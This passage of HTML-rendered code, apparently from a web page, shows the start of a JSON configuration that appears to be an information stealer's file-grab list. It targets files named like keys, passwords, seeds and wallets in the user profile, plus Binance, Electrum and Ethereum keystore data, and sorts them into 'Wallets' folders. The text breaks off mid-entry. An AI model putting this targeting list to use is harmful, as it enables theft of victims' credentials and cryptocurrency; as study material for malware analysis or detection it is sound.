class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br><span class=\"line\">437</span><br><span class=\"line\">438</span><br><span class=\"line\">439</span><br><span class=\"line\">440</span><br><span class=\"line\">441</span><br><span class=\"line\">442</span><br><span class=\"line\">443</span><br><span class=\"line\">444</span><br><span class=\"line\">445</span><br><span class=\"line\">446</span><br><span class=\"line\">447</span><br><span class=\"line\">448</span><br><span class=\"line\">449</span><br><span class=\"line\">450</span><br><span class=\"line\">451</span><br><span class=\"line\">452</span><br><span class=\"line\">453</span><br><span class=\"line\">454</span><br><span class=\"line\">455</span><br><span class=\"line\">456</span><br><span class=\"line\">457</span><br><span class=\"line\">458</span><br><span class=\"line\">459</span><br><span class=\"line\">460</span><br><span class=\"line\">461</span><br><span class=\"line\">462</span><br><span class=\"line\">463</span><br><span class=\"line\">464</span><br><span class=\"line\">465</span><br><span class=\"line\">466</span><br><span class=\"line\">467</span><br><span class=\"line\">468</span><br><span class=\"line\">469</span><br><span class=\"line\">470</span><br><span class=\"line\">471</span><br><span class=\"line\">472</span><br><span class=\"line\">473</span><br><span class=\"line\">474</span><br><span class=\"line\">475</span><br><span class=\"line\">476</span><br><span class=\"line\">477</span><br><span class=\"line\">478</span><br><span class=\"line\">479</span><br><span class=\"line\">480</span><br><span class=\"line\">481</span><br><span class=\"line\">482</span><br><span class=\"line\">483</span><br><span class=\"line\">484</span><br><span class=\"line\">485</span><br><span class=\"line\">486</span><br><span class=\"line\">487</span><br><span class=\"line\">488</span><br><span class=\"line\">489</span><br><span class=\"line\">490</span><br><span class=\"line\">491</span><br><span class=\"line\">492</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;v&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">1</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;c&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%userprofile%&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*.txt&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Important Files/Profile&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%userprofile%&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*key*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Important Files/Profile&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%userprofile%&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*bitcoin*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Important Files/Profile&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">3</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%userprofile%&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*binance*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Important Files/Profile&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">3</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%userprofile%&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*exodus*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Important Files/Profile&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">3</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%userprofile%&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*coinbase*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Important Files/Profile&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">3</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%userprofile%&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*wallet*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Important Files/Profile&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">3</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%userprofile%&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*seed*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Important Files/Profile&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">3</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%userprofile%&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*pass*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Important Files/Profile&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">3</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%userprofile%&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*ledger*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Important Files/Profile&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">3</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%userprofile%&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*trezor*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Important Files/Profile&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">3</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%userprofile%&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*metamask*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Important Files/Profile&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">3</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%userprofile%&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*crypto*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Important Files/Profile&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%appdata%\\\\Binance&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;app-store.json&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Wallets/Binance&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%appdata%\\\\Binance&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;.finger-print.fp&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Wallets/Binance&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%appdata%\\\\Binance&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;simple-storage.json&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Wallets/Binance&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%appdata%\\\\Electrum\\\\wallets&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Wallets/Electrum&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%appdata%\\\\Ethereum&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;keystore&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Wallets/Ethereum&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span 